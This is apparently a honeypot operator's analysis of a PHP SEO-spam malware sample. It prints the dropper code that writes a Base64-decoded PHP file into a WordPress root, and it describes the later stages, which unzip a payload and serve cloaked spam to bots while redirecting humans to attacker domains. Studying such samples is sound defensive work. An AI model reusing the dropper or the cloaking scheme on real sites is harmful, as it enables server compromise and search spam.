# nptzow PHP malware

Caching SEO tool. Does different things for "humans" and for "bots".

## Origin

PHP "dropper" code passed to a fake WSO ([Web Shell by oRb]())
via the `Php` action. WSO has a way to evaluate arbitrary PHP source
code via the `eval()` builtin. The "action" string and the PHP source
to eval arrive via POST parameters.

The fake WSO is part of a WordPress honeypot I've operated off and on
for the last 4 years. Everything assumed to happen in a WordPress
installation.

The downloader seems to believe that the WSO instance is hidden in
a "revslider" plugin.
[Revslider had an exploit](https://blog.sucuri.net/2014/12/revslider-vulnerability-leads-to-massive-wordpress-soaksoak-compromise.html) in the December, 2014 timeframe,
and a lot of bottom feeders tried to exploit it at the time.

### Source IP Address

This code got downloaded from 194.165.16.79, which is 194.165.16.0/23AS48721,
a European IP address in Monaco, of all places. Reverse DNS lookup says it
has the host name `hostby.adm-service.org.`

`whois adm-service.org` yields some Monaco names, addresses and telephone numbers.

`whois 194.165.16.79` gives me some information about the AS, which is
registered to "ADM Service Ltd.", head office in Moscow.

## Dropper

    $a="PD9waHAgCmlmKCBpc3NldCgkX1JFUVVFU1RbInRlc3RfdXJsIl0pICl7CmVjaG8gImZpbGUgdGVzdCBva2F5IjsKCn0KDQoN
    $file_name = "4048ad7bdb2.php";
    if( !empty($_SERVER["REAL_DOCUMENT_ROOT"]) ){
        $doc_root = $_SERVER["REAL_DOCUMENT_ROOT"];
    } else {
        $doc_root = $_SERVER["DOCUMENT_ROOT"];
    }
    
    $f_n = $doc_root . "/" . $file_name;
    
    if ( !write_file($f_n, $a) )
        write_file($file_name, $a);
    
    function write_file($file_name, $a){
    
        if( file_exists($file_name) ){
            copy($file_name, $file_name."_backup");
        }
       if( file_put_contents($file_name, base64_decode($a)) )
        {
            echo "OK file saved";
            //touch($file_name, time() - 3600 * 24 * rand(10, 70));
            return true;
        }
    
        return false;
    }

The dropper code contains a blob of Base64-encoded PHP source.
It creates a file name `4048ad7bdb2.php` somewhere in a WordPress
file tree. If a file named `4048ad7bdb2.php` already resides in
the WordPress file tree, it gets moved to `4048ad7bdb2.php_backup`.
The dropper decodes the PHP source, then writes it to `4048ad7bdb2.php`.
It echoes "OK file saved", which presumably lets the process
transferring the dropper code know that the file creation and
source decoding worked.

<!---
Like a lot of PHP malware, the downloader made more than one
attempt to get a PHP file in the WordPress installation.
One attempt tried to created a file `4048ad7bdb2.php`, the
other attempt tried to create a file `
--->

Like a lot of PHP malware, the dropper makes more than one attempt
to create `4048ad7bdb2.php`. The `file_write()` function returns
a boolean that isn't checked by the caller, and it has some
commented out code that appears to set a file's time stamp to
between 10 and 70 days in the past.

Stylistically, the dropper is only a little uneven. I hypothesize
that it hasn't evolved via feature addition yet.

## Decoding

### Level 1 code

I got to level 1 code by hand-editing file `194.165.16.79WhdX2hdZm0Z2rcNQ09X9ZgAAAAA.php.file`
into file `dc1.php`. This is just the Base64-encoded string, and two
PHP function calls to create file `4048ad7bdb2.php` with the
Base64-decoded string in it.

### Level 2 code

Executing `dc1.php` yields file `4048ad7bdb2.php` which contains
yet another Based64-encoded block of bytes, and a *native PHP
implementation of Gzip*, [class PclZip](https://github.com/WordPress/WordPress/blob/master/wp-admin/includes/class-pclzip.php).

The level 2 code Base64-decodes a long string, and puts the results
in a file `nptzow.zip`. It proceeds to unzip `nptzow.zip`. If that
succeeds, it echoes the string "1425756856". If unzipping fails,
it echoes PclZip error information. Presumably this lets the
accessor of `4048ad7bdb2.php` tell if the de-coding procedure worked or not.

### nptzow.zip

`nptzow.zip` expands into a directory full of goodies, one PHP
file and two subdirectories full of apparently template files.

### Directory nptzow/

#### De-obfuscate `flvoaw.php`

Pretty print `flvoaw.php` using [revphp](https://github.com/bediger4000/reverse-php-malware)

    revphp flvoaw.php > pp1.php

#### flvoaw.php

Based on my reading of `pp1.php`, the de-obfuscated PHP source,
`flvoaw.php` does different things for "bots" versus non-bots.
It decides bot-or-not based on user agent string, but it has
a problem. It sets a variable `$user_agent_to_filter` to 
an array full of strings that seem to represent the vast majority
of web spiders/search engines that come around these days.
It does not use `$user_agent_to_filter` anywhere. Instead it
checks a much smallar array, containing only some of the strings
in `$user_agent_to_filter`.

As an added bonus, it checks if the DNS name of `$_SERVER['REMOTE_ADDR']` 
has "google" in it. If so, it's a bot.

##### Not a bot

If it decides you're not a bot, it sends you to a different URL, via:

    Location: http://caforyn.pw/for/77?d=$d&mykeys=$mykeys

The `$d` will be a string naming the host on which `floavw.php`
executes. `$mykeys` is a string derived from a GET paramenter
named `do`.

##### You are a bot

If it decides you are a bot, it looks in the `wtuds/` directory,
the cache folder, to find a file named by a GET parameter, itself
named `do`. If that file exists in the cache directory, it serves
up the HTML in the cached file.

If it doesn't find the file named by `$_GET['do']` in `wtuds/`,
it picks a file in the template directory (`sotpie/`).
It rather strangely uses `$_GET['do']` as a series of keywords,
then looks up the keywords via URL
`http://boriskq.pw/story.php`.

In the past, my honey pot has received a large number of
PHP malwares that go by `story.php`. I'll have to see if there's
a connection.

If `floavw.php` doesn't get at least 1000 bytes from boriskq.pw,
it asks `ask.com`, `google.com` and `yahoo.com` for the same keywords
that it used on `story.php`.

It writes a file in the cache directory, then sends the HTML it
got from boriskq.pw, ask.com, google.com or yahoo.com

It looks like this is a simple caching SEO tool. It redirects
"humans" to some weird web site, and it makes, and then caches,
special spam HTML for "bots".

Unfortunately, nobody has invoked `nptzow/floavw.php`, so I can't
tell what keywords they send its way.

Both boriskq.pw and caforyn.pw are registered to:

#### subdirectory sotpie/

According to the de-obfuscated source code of `flvoaw.php`,
`sotpie/` is a template folder.

#### subdirectory wtuds/

According to the de-obfuscated source code of `flvoaw.php`,
`wtuds/` is a cache folder. `wtuds/` contains two files,
`sdsdg` and `grtjtyul`.

`sdsdg` contains some HTML, which identifies itself as having
been generated by "JohnCMS".  The interesting HTML tags are:

    &lt;meta name="keywords" content="Sdsdg"&gt;
    &lt;meta name="description" content="Sdsdg"&gt;


`grtjtyul` also contains some HTML, with "Grtjtyul" appearing
in several locations throughout.
